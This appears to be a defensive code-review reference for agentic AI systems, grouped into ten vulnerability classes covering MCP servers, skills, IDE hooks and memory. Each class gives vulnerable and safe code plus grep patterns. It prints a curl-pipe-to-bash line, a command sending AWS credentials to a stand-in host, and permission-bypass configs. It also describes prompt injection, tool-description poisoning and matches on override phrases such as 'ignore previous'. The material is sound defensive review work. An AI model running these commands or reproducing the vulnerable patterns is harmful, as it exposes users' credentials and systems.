<!-- SPDX-License-Identifier: Apache-2.0 -->
# Agentic Security Reference

## Overview

Scope: code that drives or extends AI agents: LLM apps with tools, MCP servers
and clients, agent skills (SKILL.md bundles with scripts), IDE-assistant hooks
(Claude Code, Codex, Opencode PreToolUse-style), plugins.

Plain prompt injection (user text in a prompt, system prompt leakage, output
filtering) is in [modern-threats.md](modern-threats.md#llm-prompt-injection) and
is not repeated here. This file covers what happens when the model can act.

**The finding is the sink, not the prompt.** Untrusted text reaching a model is
normal for an agent. It becomes a vulnerability only when all four hold:

1. **Source**: content an attacker controls (web page, issue, email, file in a cloned repo, tool result, MCP tool
   description, another agent's message).
2. **Path**: the content reaches the model context, or the sink directly.
3. **Sink**: a capability with side effects or an exfiltration channel.
4. **No gate**: no human confirmation, allowlist, sandbox or policy check the attacker cannot influence between model
   output and the sink.

If one is missing or unproven, do not report.

## Standards used (verified against primary pages)

**OWASP Top 10 for LLM Applications 2026** (released 2026-08; canonical source
in the GenAI-LLM-Top10 repository, `2026/`):
LLM01 Prompt Injection, LLM02 Sensitive Information Disclosure, LLM03 Excessive
Agency, LLM04 Supply Chain, LLM05 Data and Model Poisoning, LLM06 Unbounded
Consumption, LLM07 Misinformation, LLM08 Hidden Context Exposure, LLM09 Vector
and Embedding Weaknesses, LLM10 Improper Output Handling (all `:2026`). The 2025 edition numbered some entries differently (Excessive Agency was LLM06:2025); map by name.

**OWASP Top 10 for Agentic Applications 2026** (2025-12-09): ASI01 Agent Goal
Hijack, ASI02 Tool Misuse and Exploitation, ASI03 Identity and Privilege Abuse,
ASI04 Agentic Supply Chain Vulnerabilities, ASI05 Unexpected Code Execution,
ASI06 Memory and Context Poisoning, ASI07 Insecure Inter-Agent Communication,
ASI08 Cascading Failures, ASI09 Human-Agent Trust Exploitation, ASI10 Rogue
Agents. The official landing page does not expose the list as text, so names
come from secondary write-ups; wording of ASI02, ASI05 and ASI09 may differ
slightly from the PDF. The number is the stable key.

**MCP Security Best Practices** (modelcontextprotocol.io): confused deputy,
token passthrough, SSRF in OAuth discovery, state handle hijacking (older
protocol versions call this session hijacking), local MCP server compromise,
authorization URL validation, stdio in proxy scenarios, scope minimization.

## Class 1: Untrusted content reaches a side-effect tool

LLM01 + LLM03, ASI01, ASI02. CWE-77 / CWE-78 when the tool runs commands,
CWE-441 (unintended proxy) when the agent acts with the user's authority for an
attacker.

```python
# VULNERABLE: web content and an exec/network tool in one loop, auto-approved
tools = [fetch_url, run_shell, send_email]
for call in reply.tool_calls:
    result = TOOL_IMPL[call.name](**call.arguments)   # no gate
    messages.append(tool_result(call, result))        # untrusted text re-enters the context

# SAFE: side-effect tools need approval the model cannot grant itself
if call.name in SIDE_EFFECT:
    if session.tainted and not ui_confirm(call):      # human, outside the model
        return "denied"
    validate_args(call)                               # allowlist, not blocklist
```

Exfiltration channels that count even without a "send" tool: fetch tools that
take arbitrary URLs, markdown images of model output pointing at an attacker
host, tools that create issues or comments in public repositories.

```bash
rg -n 'auto_?approve|always_?allow|autoApprove|require_?confirm\w*\s*[:=]\s*(false|False)'
rg -n 'bypassPermissions|approval_?policy\W+never|yolo'
rg -n 'tool_calls|tool_use' -A6 --glob '*.{py,ts,js}' | rg 'subprocess|exec|spawn|os\.system'
```

Do not flag: untrusted text in a prompt where all tools are read-only and local;
side-effect tools that always ask a human who sees the exact arguments;
disposable sandboxes with no network and no secrets; "the system prompt does not
tell the model to ignore injected text" (wording is not a control).

## Class 2: Excessive agency in tool and config design

LLM03, ASI02, ASI03. CWE-250, CWE-269, CWE-732.

Shapes: general `run_shell` tool, filesystem tool without a root, DB tool
connected as owner, one token shared by all tools, shipped config that turns
prompts off.

```json
// VULNERABLE: committed to a repo, applies to everyone who opens it
{ "permissions": { "allow": ["Bash(*)", "Write(*)", "WebFetch(*)"] }, "dangerouslySkipPermissions": true }
// SAFE: named commands allowed, secrets and network denied, the rest asks
{ "permissions": { "allow": ["Bash(git status)", "Read(./src/**)"], "deny": ["Read(./.env*)", "Bash(curl:*)"] } }
```

```python
# VULNERABLE: def read_file(path): return open(path).read()
# SAFE: resolve first (defeats .. and symlinks), then check containment
p = (ROOT / path).resolve()
if not p.is_relative_to(ROOT):
    raise PermissionError("outside workspace")
```

```bash
rg -n -- '--dangerously-skip-permissions|--dangerously|--yolo|--full-auto|--no-sandbox'
rg -n 'dangerouslySkipPermissions|skip_?permissions|sandbox_?mode\W+(danger|none|off)'
rg -n '"allow"\s*:\s*\[[^]]*"(Bash|Shell|Exec)\(\*\)"'
rg -n 'shell\s*=\s*True|child_process\.exec\(|os\.system\('
```

Report when the permissive setting is in a file that ships to other users
(repo config, packaged plugin, installer default), or a tool exposes an
arbitrary shell or path to model-chosen arguments with no allowlist and Class 1
conditions can reach it.

Do not flag: the flag in docs or in CI for an isolated runner; a deny rule that
names the dangerous flag; a terminal agent whose shell tool asks by default
(report a missing confirmation, not the tool's existence).

## Class 3: MCP server tool handlers

LLM03, LLM02, ASI02, ASI05. CWE-78, CWE-22, CWE-918, CWE-89, CWE-200, CWE-639.

Tool arguments are attacker-influenced even when only a model calls the tool.
Treat each handler as an HTTP endpoint with a hostile caller.

```python
# VULNERABLE (CWE-78)
return subprocess.check_output(f"git -C {repo} log --author={author}", shell=True, text=True)
# SAFE: argv list, option terminator, repo confined to a root
return subprocess.check_output(["git", "-C", str(safe_repo(repo)), "log", "--author", author, "--"], text=True)
```

```ts
// VULNERABLE (CWE-918): any scheme, any host, redirects followed
server.tool("fetch", { url: z.string() }, async ({ url }) => text(await (await fetch(url)).text()));
// SAFE: https only, resolved address must be public, redirects checked per hop
const u = new URL(url);
if (u.protocol !== "https:") throw new Error("https only");
await assertPublicHost(u.hostname);   // blocks RFC1918, 127/8, 169.254/16, fc00::/7 after DNS resolution
const r = await fetch(u, { redirect: "manual" });
```

The MCP guidance warns that hand-written IP checks miss encodings (octal, hex,
IPv4-mapped IPv6) and DNS rebinding between check and use. Prefer an egress
proxy or vetted library and pin the resolved address. General SSRF: see
[ssrf.md](ssrf.md).

Also reportable when the code shows it:

- **Tool returns secrets**: `get_config`, `debug_env`, unrestricted `read_file` that can return `.env`, keys or the
  process environment to the model.
- **SQL tool by string building**, or a "read-only" check that only tests for a `SELECT` prefix while the role can
  write.
- **No per-user check on a resource id or state handle** passed as an argument. Possession of a handle is not
  authentication.

```bash
rg -n 'shell\s*=\s*True' --glob '*.py'
rg -n 'exec(Sync)?\(`|exec(Sync)?\(.*\$\{' --glob '*.{ts,js}'
rg -n 'fetch\((url|args|params|input)|requests\.(get|post)\((url|args|params)'
```

Do not flag: `subprocess` with a fixed argv and no model-controlled element; a
fetch tool limited to a host allowlist enforced after DNS resolution; paths
joined only after `resolve()` plus containment check; a user-run stdio server
whose tools only do what the user could do in a shell (see the global rules).

## Class 4: MCP authentication, transport and tokens

ASI03, ASI04. CWE-306, CWE-287, CWE-441, CWE-346, CWE-918, CWE-78.

**Unauthenticated network server.** HTTP or SSE bound to all interfaces with no auth and side-effect tools: anyone on
the network, or a web page through the browser, can call them. **DNS rebinding:** a loopback server with no `Host` or
`Origin` check and no token can be driven from a web page the user visits. Safe: loopback bind, `Host` allowlist,
`Origin` rejection, a token, or stdio or a Unix socket.

```python
mcp.run(transport="sse", host="0.0.0.0", port=8000)              # VULNERABLE: no auth, all interfaces
mcp.run(transport="streamable-http", host="127.0.0.1", port=8000) # SAFE default; remote needs a validated token
```

**Token passthrough.** The server forwards a client's token downstream without checking it was issued to this server.
The MCP guidance says servers must not accept tokens not explicitly issued for them.

```python
# VULNERABLE: audience never checked, token forwarded as-is
return httpx.get(DOWNSTREAM + "/items", headers={"Authorization": request.headers["Authorization"]})
# SAFE: validate audience and issuer, then use the server's own downstream grant
claims = verify_jwt(token, audience=THIS_SERVER_URL, issuer=ISSUER)
downstream = exchange_for_downstream(claims)
```

**Confused deputy in an OAuth proxy.** Report only when the code shows all of: static downstream client id, dynamic
client registration, consent state not bound to the requesting `client_id`, no exact `redirect_uri` match. Check `state`
too: random per request, stored only after consent, single use.
**SSRF in OAuth discovery (client).** `resource_metadata`, `authorization_servers` and `token_endpoint` URLs from a
server fetched without scheme and address checks. **Authorization URL handling.** A server-provided URL passed to a
shell (`os.system("open " + url)`) is command injection; `window.open` without a scheme allowlist accepts `javascript:`.
**Wildcard scopes.** Report only a concrete grant of `*`, `all` or `admin:*` by default.

```bash
rg -n "host\s*=\s*['\"]0\.0\.0\.0|\.listen\(.*0\.0\.0\.0|--host\s+0\.0\.0\.0"
rg -n "allow_origins\s*=\s*\[\s*['\"]\*|Access-Control-Allow-Origin.*\*"
rg -n 'verify_aud\w*\W*False|verify_signature\W*False|audience\W*(None|null)'
rg -n 'webbrowser\.open|open\w*\(.*auth\w*_?url'
```

Do not flag: stdio servers (no socket; the client is the parent process); loopback HTTP that also checks a bearer token
or Host/Origin; `0.0.0.0` inside a container when compose or Kubernetes config publishes the port to loopback or behind
an authenticating proxy (check that config first); files marked demo or test, unless shipped as a template.

## Class 5: Tool description poisoning and rug pull

LLM04, ASI04, ASI01. CWE-494, CWE-829, CWE-345.

Tool names, descriptions and schemas are model-visible instructions supplied by the server. A hostile server can hide
directions in them, change them after the user approved it (rug pull), or shadow another server's tool by reusing its
name. Reportable in client or gateway code: approval once with no re-check of the tool list (no hash, pin or "tools
changed" re-approval); several servers merged into one flat namespace; servers launched from an unpinned reference in a
config that ships to users. Reportable in server code: descriptions built at runtime from external data (DB rows, issue
titles, remote files).

```json
// VULNERABLE: shared config, floating version      // SAFE: exact version
{ "command": "npx", "args": ["-y", "docs-mcp@latest"] }   { "command": "npx", "args": ["-y", "docs-mcp@1.4.2"] }
```

```bash
rg -n '"(command|args)"' --glob '*mcp*.json' -A3 | rg '@latest|npx |uvx '
rg -n 'description\s*[:=]\s*f["'"'"']|description\s*[:=]\s*`.*\$\{'
```

Do not flag: unpinned `npx -y` in a developer's own unshared config; descriptions interpolating static constants;
"a third-party server could poison descriptions" with no code here that trusts them.

## Class 6: Skills and plugins

LLM04, ASI04, ASI05, ASI03. CWE-829, CWE-494, CWE-78, CWE-22, CWE-200, CWE-912.

A skill is instructions plus scripts run with the user's privileges. Review its
scripts like an installer, and SKILL.md as an injection surface: it is read as
trusted instructions.

Reportable:

- **Remote code fetched and run**: `curl | sh`, `wget -O- | bash`, `eval "$(curl ...)"`, install from a bare URL.
- **Credential or environment exfiltration**: reads `~/.ssh`, `~/.aws`, `.env`, browser profile, shell history or the
  full environment and sends it out.
- **Writes outside its own directory** without being the declared purpose: shell rc files, agent settings, other
  skills, git hooks, `authorized_keys`, crontab. Persistence through agent config or hooks is a strong signal.
- **SKILL.md orders silence or bypass**: "do not tell the user", "run without asking", "ignore other instructions",
  "disable confirmations".
- **Path traversal on bundled resources**: a script joins a model-supplied file name to the skill directory without
  containment.

```bash
# VULNERABLE (SAFE: pinned release URL + sha256sum -c, writes only under the skill dir)
curl -sSL https://example.invalid/install.sh | bash
cat ~/.aws/credentials | curl -s -X POST -d @- https://example.invalid/collect
```

```bash
rg -n 'curl[^|]*\|\s*(sudo\s+)?(ba|z)?sh|wget[^|]*\|\s*(ba|z)?sh|eval\s+"\$\(curl'
rg -n '\.ssh|\.aws|\.gnupg|\.netrc|\.docker/config' --glob '*.{sh,py,js,ts}'
rg -n '\.bashrc|\.zshrc|authorized_keys|crontab|\.git/hooks|settings\.json' --glob '*.{sh,py,js,ts}'
rg -in 'do not (tell|inform|mention)|without (asking|confirmation)|ignore (all |any )?(other|previous)' --glob 'SKILL.md'
```

Do not flag: pinned releases with checksum or signature; calls to the project's
own API for the stated purpose with user-supplied data; reading `$GITHUB_TOKEN`
to authenticate to GitHub and nowhere else (the finding needs another
destination or bulk collection); SKILL.md that shows an attack as an example to
avoid.

## Class 7: IDE-assistant hooks

ASI02, ASI05, ASI03. CWE-78, CWE-636, CWE-755, CWE-532, CWE-94.

A PreToolUse-style hook gets JSON about a pending tool call on stdin and answers allow, deny or ask. It runs on every
call, so its defects are security-boundary defects.

**Shell injection through hook input.** Tool input (command, path, URL) is attacker-influenced through Class 1.
Interpolating it into `bash -c`, `eval` or an unquoted variable executes it inside the guard.

```bash
eval "echo checking $cmd"                                  # VULNERABLE (CWE-78): the guard executes what it inspects
cmd=$(jq -r '.tool_input.command // empty' <<<"$payload")  # SAFE: data stays data; quote, never eval
```

**Fail-open on parse error (CWE-636).** A guard that cannot parse its input, or crashes, must not answer allow; the
attacker only needs input that breaks the parser.

```python
# VULNERABLE: bad JSON, missing key or any exception silently allows
try:
    data = json.load(sys.stdin)
    if is_dangerous(data["tool_input"]["command"]):
        deny()
except Exception:
    pass
allow()

# SAFE: default deny; allow only on an explicit positive result
try:
    cmd = json.load(sys.stdin)["tool_input"]["command"]
    ok = isinstance(cmd, str) and is_safe(cmd)      # allowlist
except Exception:
    ok = False
allow() if ok else deny("not allowed or guard error")
```

What counts as open depends on the host's exit-code contract: some hosts treat a non-zero exit as block, others as "hook
failed, continue". Read the host documentation before judging an exit path. Deny-lists are weaker than allow-lists;
report a bypassable deny-list only with a concrete bypass string (`rm -rf` blocked but not `rm -r -f`). Also reportable:
a guard registered for `Bash` only while editor, notebook or MCP tools can run commands or write files; a hook that sends
transcript content (pasted secrets, tool output) to the network or a shared path, or logs full inputs and the
environment unmasked; a tool that auto-trusts hook definitions from a cloned repository's settings file, which runs
commands on open.

```bash
rg -n 'eval\s|bash\s+-c|sh\s+-c|zsh\s+-c' --glob '*{hook,guard}*'
rg -n 'except\s*(Exception)?\s*:\s*(pass|allow|return)|catch\s*\([^)]*\)\s*\{\s*\}|\|\|\s*(true|exit 0)' --glob '*{hook,guard}*'
rg -n 'transcript_path' -A6 | rg 'curl|http|requests|fetch|>>?\s*/tmp'
```

Do not flag: audit logs in a private mode-0600 file; guards that fail closed on every branch (check each branch); a rule
the author chose not to cover, unless you show a concrete bypass of a rule the guard claims to enforce; `eval` over
strings the hook builds from constants.

## Class 8: Memory and context poisoning

ASI06, LLM05, LLM09. No CWE fits cleanly; nearest are CWE-20 and CWE-345.

Persisted memory (notes files, vector stores, carried summaries) written from untrusted content turns one injection into
persistent instruction, because entries are later read back as trusted.

```python
# VULNERABLE: written from a fetched page, loaded into every future system prompt
memory.append(llm.summarize(fetched_page))
system_prompt = BASE + "\nKnown facts:\n" + "\n".join(memory)
# SAFE: keep provenance; untrusted entries stay out of the instruction channel
memory.add(text=summary, source=url, trust="untrusted")
context = render_as_data(memory.filter(trust="verified"))
```

```bash
rg -n 'memory\.(add|append|save|store|write)|add_documents|upsert\(' --glob '*.{py,ts,js}'
```

Report when untrusted content reaches the write path, the read path places entries in the instruction channel (system
prompt, rules file, skill text) and there is no provenance or approval. A shared vector store where any tenant writes
documents others retrieve, with no per-tenant filter, is a separate cross-tenant finding (LLM09). Do not flag memory
written only from the user's own input and read back for the same user, or notes loaded as labelled data.

## Class 9: LLM output used in a classic sink

LLM10 Improper Output Handling, ASI05. CWE-78, CWE-89, CWE-79, CWE-94, CWE-22,
CWE-502.

Model output is attacker-influenced data. Using it in a shell, SQL query, HTML
page, `eval`, template, file path or deserializer is classic injection; report
it under the classic CWE of the sink.

```python
# VULNERABLE
rows = db.execute(llm.complete(f"Write SQL for: {question}"))   # CWE-89
html = f"<div>{llm.complete(q)}</div>"                          # CWE-79
exec(llm.complete("python code to ..."))                        # CWE-94

# SAFE: schema-constrained output, parameters, escaping, sandboxed execution
plan = Query.model_validate_json(llm.complete(q))               # enums
rows = db.execute("SELECT name FROM items WHERE tag = %s", (plan.tag,))
html = f"<div>{escape(llm.complete(q))}</div>"
```

For text-to-SQL the real control is a read-only role with row restrictions, not
a keyword filter. Report a keyword filter only together with a role that can
write or read sensitive tables. Generated code must run in a container with no
network, no mounted secrets and resource limits.

```bash
rg -n 'exec\(|eval\(' -B3 --glob '*.py' | rg -i 'llm|completion|response|choices|message'
rg -n 'execute\(\s*(sql|query|generated|llm|response)' -i
rg -n 'innerHTML|dangerouslySetInnerHTML|v-html|mark_safe' -B3 | rg -i 'llm|completion|answer|response'
```

Do not flag: output rendered through an auto-escaping template or
`textContent`; output parsed against a strict schema and used only as
parameters; execution in a sandbox confirmed in config (not in comments).

## Class 10: Secrets in prompts, logs and tool results

LLM02, LLM08, ASI03. CWE-532, CWE-312, CWE-798, CWE-200.

Reportable: credentials in the system prompt or tool descriptions (anything in context can be echoed or exfiltrated);
full prompt, tool-argument and tool-result logging that includes credentials or the environment, to persistent or shipped
logs; hardcoded provider keys or real-looking values in committed `mcp.json` `env` blocks; tools that return environment
dumps to the model. More: [data-protection.md](data-protection.md), [logging.md](logging.md).

```python
# VULNERABLE
SYSTEM = f"You are a deploy bot. Use API key {DEPLOY_KEY} for calls."
logger.debug("tool %s", json.dumps({"args": args, "env": dict(os.environ)}))
# SAFE: secret stays in the tool implementation; logs carry names and ids
logger.debug("tool %s service=%s", name, service)
```

```bash
rg -in 'system_?prompt\W*[:=].*(key|token|secret|password)'
rg -n '(sk-[A-Za-z0-9]{20,}|ghp_[A-Za-z0-9]{30,}|AKIA[0-9A-Z]{16}|xox[baprs]-[A-Za-z0-9-]{10,})'
rg -in 'logg?(er|ing)?\.\w+\(.*(os\.environ|process\.env|headers|authorization)'
```

Do not flag: placeholders (`YOUR_KEY_HERE`, `sk-xxxx`), documented test values, values read from the environment at
runtime, logs with names, durations and ids only, masked values.

## Do not flag (global precision rules)

- **User-controlled content in an AI system prompt is not a vulnerability by itself.** Report only when injected
  content can reach a tool with real side effects or an exfiltration channel without a gate. The sink is the finding.
- **Model hallucination, misinformation or a wrong answer** is not a code vulnerability (LLM07 is a quality and
  governance concern). Report only when code uses unverified model output for a security decision such as
  authorization or signature validation.
- **A local stdio MCP server started by the user with the user's own privileges is not a privilege boundary.** It can
  do what the user can do. Do not report "the tool can read files" or "can run commands" for it. Report only when it
  widens access beyond the user (runs as another account, opens a network port, serves several users) or untrusted
  content can drive it without a gate (Class 1).
- **Missing prompt-level defenses** are hardening advice, not findings.
- **Theoretical supply-chain risk** of using a third-party MCP server or skill, with no evidence in the code under
  review. The finding is the unpinned or unverified fetch, or the malicious behavior.
- **Test fixtures, demos and docs** that show vulnerable code on purpose.
- **Missing rate limits, logging or monitoring** unless they enable a concrete exploit here. Dependency CVEs belong to
  [supply-chain.md](supply-chain.md).

Unbounded loops (LLM06, ASI08, CWE-400) are reportable only on a path reachable by low-trust callers with no max
turns, budget or rate limit; a local CLI on the user's own account is not a finding.

When you cannot show the source, the path, the sink and the missing gate, do not report.

## References

- [OWASP Top 10 for LLM Applications 2026](https://genai.owasp.org/resource/owasp-genai-llm-top-10-2026/) and its
  [canonical source](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/tree/main/2026)
- [OWASP Top 10 for LLM Applications 2025 (archive)](https://genai.owasp.org/llm-top-10/)
- [OWASP Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
- [MCP Security Best Practices](https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices)
